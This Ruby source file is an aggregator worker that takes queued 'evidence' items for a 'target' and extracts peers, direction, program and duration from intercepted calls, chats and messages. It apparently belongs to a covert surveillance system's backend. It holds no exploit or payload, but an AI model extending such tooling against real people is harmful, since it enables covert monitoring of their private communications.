#
# Aggregator processing module
#
# the evidence to be processed are queued by the workers
#

require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/sanitize'
require 'fileutils'

module RCS
module Aggregator

class Processor
  extend RCS::Tracer

  def self.run
    db = Mongoid.database
    coll = db.collection('aggregator_queue')

    # infinite processing loop
    loop do
      # get the first entry from the queue and mark it as processed to avoid
      # conflicts with multiple processors
      if entry = coll.find_and_modify({query: {flag: AggregatorQueue::QUEUED}, update: {"$set" => {flag: AggregatorQueue::PROCESSED}}})
        count = coll.find({flag: AggregatorQueue::QUEUED}).count()
        trace :info, "#{count} evidence to be processed in queue"
        process entry
      else
        #trace :debug, "Nothing to do, waiting..."
        sleep 1
      end
    end
  end


  def self.process(entry)
    ev = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])
    target = Item.find(entry['target_id'])

    trace :info, "Processing #{ev.type} for target #{target.name}"

    # extract peer(s) from call, mail, chat, sms
    data = extract_data(ev) if ['CALL', 'CHAT', 'MESSAGE'].include? ev.type

    trace :debug, ev.data.inspect
    trace :debug, "PARSED: #{data.inspect}"

  rescue Exception => e
    trace :error, "Cannot process evidence: #{e.message}"
    #trace :error, e.backtrace.join("\n")
    #FileUtils.rm_rf temp
    #FileUtils.mv temp, temp + '.jpg'
    #exit!
  end

  def self.extract_data(ev)
    data = {}

    case ev.type
      when 'CALL'
        data = {:peer => ev.data['peer'], :versus => ev.data['incoming'] == 1 ? :in : :out, :type => ev.data['program'], :duration => ev.data['duration']}
      when 'CHAT'
        data = {:peer => ev.data['peer'], :versus => nil, :type => ev.data['program']}
      when 'MESSAGE'
        if ev.data['type'] == :mail
          data = {:peer => ev.data['incoming'] == 1 ? ev.data['from'] : ev.data['rcpt'], :versus => ev.data['incoming'] == 1 ? :in : :out, :type => ev.data['type']}
        else
          data = {:peer => ev.data['incoming'] == 1 ? ev.data['from'] : ev.data['rcpt'], :versus => ev.data['incoming'] == 1 ? :in : :out, :type => ev.data['type']}
        end
    end

    return data
  end

end

end #OCR::
end #RCS::